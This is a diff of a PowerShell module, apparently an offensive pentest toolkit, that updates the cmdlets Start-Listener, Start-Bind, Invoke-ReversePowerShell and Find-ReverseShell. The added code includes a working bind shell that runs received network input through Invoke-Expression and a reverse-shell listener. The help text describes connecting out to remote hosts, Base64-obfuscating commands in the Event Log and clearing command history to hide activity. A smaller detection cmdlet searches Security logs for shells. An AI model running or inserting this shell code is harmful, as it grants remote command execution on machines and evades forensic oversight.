@@ -1,8 +1,4 @@
 <#
-.NAME
-    Start-Listener
-
-
 .SYNOPSIS
     This cmdlet is for starting a listener that a reverse shell can attach too.
 
@@ -11,40 +7,19 @@
     The Start-Listener cmdlet opens a listner port to connect to from a target machine.
 
 
-.SYNTAX
-    Start-Listener [[-Port] <int32>]
-
-
 .PARAMETER Port
     This parameter is for defining the listening port to connect too.
-    The cmdlet binds connections to the port that you specify.
-
-.PARAMETERS
-    -Port [<Int32>]
-        This parameter is for defining the listening port to connect too.
-        The cmdlet binds connections to the port that you specify.
-
-        Required?                    false
-        Position?                    0
-        Default value                1337
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    <CommonParameters>
-        This cmdlet supports the common parameters: Verbose, Debug,
-        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
-        OutBuffer, PipelineVariable, and OutVariable. For more information, see
-        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+    The cmdlet binds connections to the port that you specify. The
+    default value for this parameter is 1337.
 
 
 .EXAMPLE
-    -------------------------- EXAMPLE 1 --------------------------
-    Start-Listener -Port 1234
-    This examples connects to a listener on port 1234.
-
-    -------------------------- EXAMPLE 2 --------------------------
     Start-Listener
-    This examples connects to a listener on port 1337.
+    # This examples connects to a listener on port 1337.
+
+.EXAMPLE
+    Start-Listener -Port 1234
+    # This examples connects to a listener on port 1234.
 
 
 .NOTES
@@ -84,8 +59,23 @@ Function Start-Listener {
             [Int32]$Port = 1337
         ) # End param
 
+
+    $PortString = $Port.ToString()
+
+    Write-Verbose "Checking for availability of $PortString"
+    $PortAvailabilityCheck = Get-NetTCPConnection -State Listen | Where-Object -Property LocalPort -like $Port
+
+    If ($PortAvailabilityCheck)
+    {
+
+        $ProcessName = $PortAvailabilityCheck | Select-Object -ExpandProperty OwningProcess | ForEach-Object { Get-Process -Id $_ } | Select-Object -ExpandProperty ProcessName -Unique
+
+        Throw "[!] Port $Port is alreday in use by the below process(es). Select another port to use or stop the occupying processes.`n`n$ProcessName"
+
+    }  # End If
+
     Write-Verbose "Defining listener object"
-    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);
+    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port)
 
     If ($Null -eq $Socket)
     {
@@ -94,84 +84,87 @@ Function Start-Listener {
 
     } # End If
 
-    $PortString = $Port.ToString()
-
     Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
 
-    $Socket.Start()
-    Write-Output ("[*] Listening on [0.0.0.0] (port " + $Port + ")")
-    While ($True)
+    If ($PSCmdlet.ShouldProcess($Socket.Start()))
     {
 
-        Write-Verbose "Waiting for connection..."
-        If ($Socket.Pending())
+        Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
+        While ($True)
         {
 
-            $Client = $Socket.AcceptTcpClient()
+            Write-Verbose "Waiting for connection..."
+            If ($Socket.Pending())
+            {
 
-            Break;
+                $Client = $Socket.AcceptTcpClient()
 
-        }  # End If
+                Break;
 
-        Start-Sleep -Seconds 2
+            }  # End If
 
-     }  # End While
+            Start-Sleep -Seconds 2
 
-    Write-Output "[*] Connection Established"
+         }  # End While
 
-    Write-Verbose "Creating byte stream"
-    $Stream = $Client.GetStream()
-    $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
-    $Buffer = New-Object -TypeName System.Byte[] 2048
-    $Encoding = New-Object -TypeName System.Text.AsciiEncoding
+        Write-Output "[*] Connection Established"
 
-    Write-Verbose "Begin command execution loop"
-    Do
+        Write-Verbose "Creating byte stream"
+        $Stream = $Client.GetStream()
+        $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
+        $Buffer = New-Object -TypeName System.Byte[] 2048
+        $Encoding = New-Object -TypeName System.Text.AsciiEncoding
+
+        Write-Verbose "Begin command execution loop"
+        Do
+        {
+
+            $Command = Read-Host
+
+            $Writer.WriteLine($Command)
+            $Writer.Flush();
+
+            If ($Command -eq "exit")
+            {
+
+                Write-Verbose "Exiting"
+                Break
+
+            }  # End If
+
+            $Read = $Null
+
+            While ($Stream.DataAvailable -or $Null -eq $Read)
+            {
+
+                $Read = $Stream.Read($Buffer, 0, 2048)
+                $Out = $Encoding.GetString($Buffer, 0, $Read)
+
+                Write-Output $Out
+
+            } # End While
+
+        } While ($Client.Connected -eq $True) # End Do While Loop
+
+        Write-Verbose "Terminating connection"
+        $Socket.Stop()
+        $Client.Close()
+        $Stream.Dispose()
+        Write-Verbose "Connection closed"
+
+    }  # End If
+    Else
     {
 
-        $Command = Read-Host
+        Write-Output "[*] Start-Listener would have started a listener on port $PortString"
 
-        $Writer.WriteLine($Command)
-        $Writer.Flush();
-
-        If ($Command -eq "exit")
-        {
-
-            Write-Verbose "Exiting"
-            Break
-
-        }  # End If
-
-        $Read = $Null
-
-        While ($Stream.DataAvailable -or $Null -eq $Read)
-        {
-
-            $Read = $Stream.Read($Buffer, 0, 2048)
-            $Out = $Encoding.GetString($Buffer, 0, $Read)
-
-            Write-Output $Out
-
-        } # End While
-
-    } While ($Client.Connected -eq $True) # End Do While Loop
-
-    Write-Verbose "Terminating connection"
-    $Socket.Stop()
-    $Client.Close()
-    $Stream.Dispose()
-    Write-Verbose "Connection closed"
+    }  # End Else
 
 } # End Function Start-Listener
 
 
-
 #-------------------------------------------------------------------------------------------------------------------
 <#
-.NAME
-    Start-Bind
-
-
 .SYNOPSIS
     This cmdlet is for binding the PowerShell application to a listening port.
 
@@ -180,41 +173,19 @@ Function Start-Listener {
     Start-Bind cmdlet opens a Bind Shell that attaches to PowerShell and listens on a port that you define.
 
 
-.SYNTAX
-    Start-Bind [[-Port] <int32>]
-
-
 .PARAMETER Port
     This parameter is for defining the listening port that PowerShell should attach too
-    This cmdlet binds powershell to the port you speficy
-
-
-.PARAMETERS
-    -Port [<Int32>]
-        This parameter is for defining the listening port that PowerShell should attach too
-        The cmdlet binds powershell to the port that you specify.
-
-            Required?                    false
-            Position?                    0
-            Default value                1337
-            Accept pipeline input?       false
-            Accept wildcard characters?  false
-
-    <CommonParameters>
-        This cmdlet supports the common parameters: Verbose, Debug,
-        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
-        OutBuffer, PipelineVariable, and OutVariable. For more information, see
-        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+    This cmdlet binds powershell to the port you speficy. The default value for this
+    parameter is 1337.
 
 
 .EXAMPLE
-    -------------------------- EXAMPLE 1 --------------------------
-    Start-Bind -Port 1234
-    This examples connects powershell.exe to a listener on port 1234.
-
-    -------------------------- EXAMPLE 2 --------------------------
     Start-Bind
-    This examples connects powershell.exe to a listener on port 1337.
+    # This examples connects powershell.exe to a listener on port 1337.
+
+.EXAMPLE
+    Start-Bind -Port 1234
+    # This examples connects powershell.exe to a listener on port 1234.
 
 
 .NOTES
@@ -254,100 +225,116 @@ Function Start-Bind {
             [Int32]$Port = 1337
         )  # End param
 
+
         $PortString = $Port.ToString()
+
+        Write-Verbose "Checking for availability of $PortString"
+        $PortAvailabilityCheck = Get-NetTCPConnection -State Listen | Where-Object -Property LocalPort -like $Port
+
+        If ($PortAvailabilityCheck)
+        {
+
+            $ProcessName = $PortAvailabilityCheck | Select-Object -ExpandProperty OwningProcess | ForEach-Object { Get-Process -Id $_ } | Select-Object -ExpandProperty ProcessName -Unique
+
+            Throw "[!] Port $Port is alreday in use by the below process(es). Select another port to use or stop the occupying processes.`n`n$ProcessName"
+
+        }  # End If
+
         Write-Verbose "Creating listener on port $PortString"
-        $Listener = [System.Net.Sockets.TcpListener]$Port
-        Write-Output "[*] PowerShell.exe is bound to port $PortString"
-        $Listener.Start()
+        $Listener = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);
 
-        While ($True)
+        If ($PSCmdlet.ShouldProcess($Listener.Start()))
         {
 
-            Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
-            If ($Listener.Pending())
+            Write-Output "[*] PowerShell.exe is bound to port $PortString"
+
+
+            While ($True)
             {
 
-                $Client = $Listener.AcceptTcpClient()
+                Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
+                If ($Listener.Pending())
+                {
 
-                Break;
+                    $Client = $Listener.AcceptTcpClient()
 
-            }  # End If
+                    Break;
 
-            Start-Sleep -Seconds 1
+                }  # End If
 
-         }  # End While
+                Start-Sleep -Seconds 1
 
-        Write-Output "[*] Connection Established"
-        $Stream = $Client.GetStream()
+             }  # End While
 
-        Write-Verbose "Streaming bytes to PowerShell connection"
-        [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
-        $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")
+            Write-Output "[*] Connection Established"
+            $Stream = $Client.GetStream()
 
-        $Stream.Write($SendBytes,0,$SendBytes.Length)
-        $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-        $Stream.Write($SendBytes,0,$SendBytes.Length)
+            Write-Verbose "Streaming bytes to PowerShell connection"
+            [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
+            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Logged into PowerShell as $env:USERNAME on $env:COMPUTERNAME `n`n")
 
-        Write-Verbose "Begin command execution cycle"
-        While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            $Stream.Write($SendBytes,0,$SendBytes.Length)
+            $SendBytes = ([Text.Encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+            $Stream.Write($SendBytes,0,$SendBytes.Length)
+
+            Write-Verbose "Begin command execution cycle"
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+                $Data = $EncodedText.GetString($Bytes, 0, $i)
+
+                Try
+                {
+
+                    $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)
+
+                }  # End Try
+                Catch
+                {
+
+                    Write-Output "Failure occured attempting to execute the command on target."
+
+                    $Error[0] | Out-String
+
+                }  # End Catch
+
+                Write-Verbose "Initial data send failed. Attempting a second time"
+                $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
+                $x = ($Error[0] | Out-String)
+                $Error.clear()
+                $SendBack2 = $SendBack2 + $x
+
+                $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
+                $Stream.Write($SendByte, 0, $SendByte.Length)
+                $Stream.Flush()
+
+            }  # End While
+
+            Write-Verbose "Terminating connection"
+            $Client.Close()
+            $Listener.Stop()
+            Write-Verbose "Connection closed"
+
+        }  # End If
+        Else
         {
 
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $Data = $EncodedText.GetString($Bytes, 0, $i)
+            Write-Output "[*] Start-Bind would have bound PowerShell to a listener on port $PortString"
 
-            Try
-            {
-
-                $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)
-
-            }  # End Try
-            Catch
-            {
-
-                Write-Output "Failure occured attempting to execute the command on target."
-
-                $Error[0] | Out-String
-
-            }  # End Catch
-
-            Write-Verbose "Initial data send failed. Attempting a second time"
-            $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
-            $x = ($Error[0] | Out-String)
-            $Error.clear()
-            $SendBack2 = $SendBack2 + $x
-
-            $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2)
-            $Stream.Write($SendByte, 0, $SendByte.Length)
-            $Stream.Flush()
-
-        }  # End While
-
-        Write-Verbose "Terminating connection"
-        $Client.Close()
-        $Listener.Stop()
-        Write-Verbose "Connection closed"
+        }  # End Else
 
 }  # End Function Start-Bind
 
 
-
 #-------------------------------------------------------------------------------------------------------------------
 <#
-.NAME
-    Invoke-ReversePowerShell
-
-
 .SYNOPSIS
     This cmdlet is for connecting PowerShell to a listening port on a target machine.
-    This function is NOT able to connect to the Start-Bind cmdlet in this module.
 
 
 .DESCRIPTION
-    Connect to a lsitening port on a remote machine to complete a reverse shell.
-
-
-.SYNTAX
-    Invoke-ReversePowerShell [-IpAddress] <string> [[-Port] <int32>]
+    Establishes a connection to a lsitening port on a remote machine effectively completing a reverse or bind shell.
 
 
 .PARAMETER IpAddress
@@ -372,95 +359,18 @@ Function Start-Bind {
 .PARAMETER ClearHistory
     This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
 
-.PARAMETERS
-    -IpAddress [<String>]
-        This parameter is for defining the IPv4 address to connect too on a remote machine
-        The cmdlet looks for a connection at this IP address on the remote host.
-
-        Required?                    true
-        Position?                    0
-        Default value                none
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    -Port [<Int32>]
-        This parameter is for defining the listening port to attach too on a remote machine
-        The cmdlet looks for a connection on a remote host using the port that you specify here.
-
-        Required?                    false
-        Position?                    1
-        Default value                1337
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    -Obfuscate [<SwitchParameter>]
-        This switch parameter is used to Base64 obfuscate in the Event Log any PowerShell commands executed.
-
-        Required?                    false
-        Position?                    named
-        Default value                false
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    -ClearHistory [<SwitchParameter>]
-        This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session
-
-        Required?                    false
-        Position?                    named
-        Default value                false
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    -Reverse [<SwitchParameter>]
-        This switch parameter is used to set the ParameterSetName to Reverse
-
-        Required?                    false
-        Position?                    named
-        Default value                false
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    -Bind [<SwitchParameter>]
-        This switch parameter is used to set the ParameterSetName to Bind
-
-        Required?                    false
-        Position?                    named
-        Default value                false
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    <CommonParameters>
-        This cmdlet supports the common parameters: Verbose, Debug,
-        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
-        OutBuffer, PipelineVariable, and OutVariable. For more information, see
-        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
-
 
 .EXAMPLE
-    -------------------------- EXAMPLE 1 --------------------------
-    Invoke-ReversePowerShell 192.168.2.1 1234 -ClearHistory
     Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
-    Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+    # This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.
 
-    This above command examples all do the same thing. They connect to port 1234 on
-    remote machine 192.168.2.1 and clear the commands executed history afterwards.
-
-    -------------------------- EXAMPLE 2 --------------------------
-    Invoke-ReversePowerShell 192.168.2.1 1337 -Obfuscate
-    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+.EXAMPLE
     Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+    # This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
 
-    The above command examples all do the same thing. They connect to port 1337 on
-    remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
-
-    -------------------------- EXAMPLE 2 --------------------------
-    Invoke-ReversePowerShell -Bind 192.168.2.1 1337 -Obfuscate -ClearHistory
-    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+.EXAMPLE
     Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
-
-    The above command examples all do the same thing. They connect to bind port 1337 on
-    remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
-    The powershell command history is then attempted to be earsed.
+    # This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be earsed.
 
 
 .NOTES
@@ -668,14 +578,14 @@ Function Invoke-ReversePowerShell {
             }  # End If
 
             Write-Verbose "Begining countdown timer to reestablish failed connection"
-            [int]$Time = 30
-            $Length = $Time / 100
+            [Int]$Timer = 30
+            $Length = $Timer / 100
 
-            For ($Time; $Time -gt 0; $Time--)
+            For ($Timer; $Timer -gt 0; $Timer--)
             {
 
-                $Text = "0:" + ($Time % 60) + " seconds left"
-                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Time / $Length)
+                $Text = "0:" + ($Timer % 60) + " seconds left"
+                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Timer / $Length)
                 Start-Sleep -Seconds 1
 
             }  # End For
@@ -686,12 +596,9 @@ Function Invoke-ReversePowerShell {
 
 } # End Function Invoke-ReversePowerShell
 
+
 #-------------------------------------------------------------------------------------------------------------------
 <#
-.NAME
-    Find-ReverseShell
-
-
 .SYNOPSIS
     This cmdlet can be used to discover reverse shell connections from the past 24 hours. It will ignore connections from
     the user Paessler as PRTG uses a similar method for creating a TCP socket listener. This will not identify powercat.ps1
@@ -707,49 +614,17 @@ Function Invoke-ReversePowerShell {
     This parameter is for helping to better define a connection you may want to look for. This parameter is currently
     not in use for this cmdlet.
 
-.PARAMETER Path
+.PARAMETER FilePath
     Specifies a path to one locations. Wildcards are not permitted.
-
-.PARAMETERS
-    -ComputerName [<String>]
-        This parameter is for helping to better define a connection you may want to look for. This parameter is currently
-        not in use for this cmdlet.
-
-            Required?                    false
-            Position?                    0
-            Default value                none
-            Accept pipeline input?       false
-            Accept wildcard characters?  false
-
-    -Path [<String>]
-        Specifies a path to one locations. Wildcards are not permitted.
-
-        Required?                    false
-        Position?                    1
-        Default value                none
-        Accept pipeline input?       false
-        Accept wildcard characters?  false
-
-    <CommonParameters>
-        This cmdlet supports the common parameters: Verbose, Debug,
-        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
-        OutBuffer, PipelineVariable, and OutVariable. For more information, see
-        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
-
-
-.SYNTAX
-    Find-ReverseShell [-ComputerName <string>] [-FilePath <string>]
 
 
 .EXAMPLE
-    -------------------------- EXAMPLE 1 --------------------------
     Find-ReverseShell
-        This example searches for connections from a remote host.
+    # This example searches for connections from a remote host.
 
-    -------------------------- EXAMPLE 2 --------------------------
+.EXAMPLE
     Find-ReverseShell -ComputerName Desktop01 -FilePath C:\Temp\log.evt
-        This example searches the localhost for evidence of reverse shell connections built on connections to a tcp socket.
-        It also saves the log file to C:\Users\<username>\AppData\Local\ReverseShell_Logs_2020.01.20.evt
+    # This example searches the localhost for evidence of reverse shell connections built on connections to a tcp socket. It also saves the log file to C:\Users\<username>\AppData\Local\ReverseShell_Logs_2020.01.20.evt
 
 
 .NOTES
@@ -766,6 +641,7 @@ Function Invoke-ReversePowerShell {
     System.Diagnostics.Eventing.Reader.EventLogntLogRecord
     Find-ReverseShell returns System.Diagnostics.Eventing.Reader.EventLogRecord objects.
 
+
 .LINK
     https://roberthsoborne.com
     https://osbornepro.com
@@ -778,24 +654,44 @@ Function Invoke-ReversePowerShell {
 
 #>
 Function Find-ReverseShell {
-    [CmdletBinding()]
+    [CmdletBinding(DefaultParameterSetName="Local")]
         param(
             [Parameter(
+                ParameterSetName="Remote",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage="Enter a hostname, FQDN, or an IPv4 address")]
+            [Parameter(
+                ParameterSetName="Local",
                 Mandatory=$False,
                 Position=0,
-                HelpMessage="Enter a hostname, FQDN, or an IPv4 address")]
-            [string]$ComputerName = $env:COMPUTERNAME,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage="Enter a hostname, FQDN, or an IPv4 address and follow multiple values using a comma.")]
+            [Alias("cn","Computer")]
+            [String[]]$ComputerName = $env:COMPUTERNAME,
 
             [Parameter(
+                ParameterSetName="Remote",
                 Mandatory=$False,
                 Position=1,
-                HelpMessage="Enter the full path name to a .evt file. Example: C:\Temp\results.evt")]
-            [string]$FilePath = "$env:LOCALAPPDATA\ReverseShell_Logs_" + (Get-Date -Format 'yyyy.MM.dd') + ".xml"
+                HelpMessage="Enter the full path name to a .xml file. Example: C:\Temp\results.xml")]
+            [Parameter(
+                ParameterSetName="Local",
+                Mandatory=$False,
+                Position=1,
+                HelpMessage="Enter the full path name to a .xml file. Example: C:\Temp\results.xml")]
+            [Alias("Path")]
+            [ValidateScript( {If ((!(Test-Path -Path $FilePath)) -and ($FilePath -like "*.xml")) {New-Item -Type Directory -Path $FilePath}} )]
+            [System.IO.FileInfo]$FilePath
+
         ) # End param
 
 
     Write-Output "Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object"
-    $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorAction SilentlyContinue
+    $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorVariable $CmdError
 
     ## This part is a work in progress. Need to discover how to identify this connection.
     # Write-Output "Checking for a Reverse Shell created by a tool such as PowerCat that execute Reverse Shell commands as a process using WSMAN"
@@ -804,13 +700,18 @@ Function Find-ReverseShell {
     If ($Null -ne $TcpListenerCheck)
     {
 
-        Write-Verbose "Event was found"
+        Write-Verbose "Shell Event was found"
         $TcpListenerCheck | Select-Object -Property *
 
-        Write-Verbose "Building XML file"
-        $TcpListenerCheck.ToXml() | Out-File -FilePath $FilePath
+        If ($FilePath)
+        {
 
-        Write-Warning "A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."
+            Write-Verbose "Building XML file and saving too $FilePath"
+            $TcpListenerCheck.ToXml() | Out-File -FilePath "$FilePath"
+
+            Write-Warning "A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."
+
+        }  # End If
 
     }  # End If
     Else
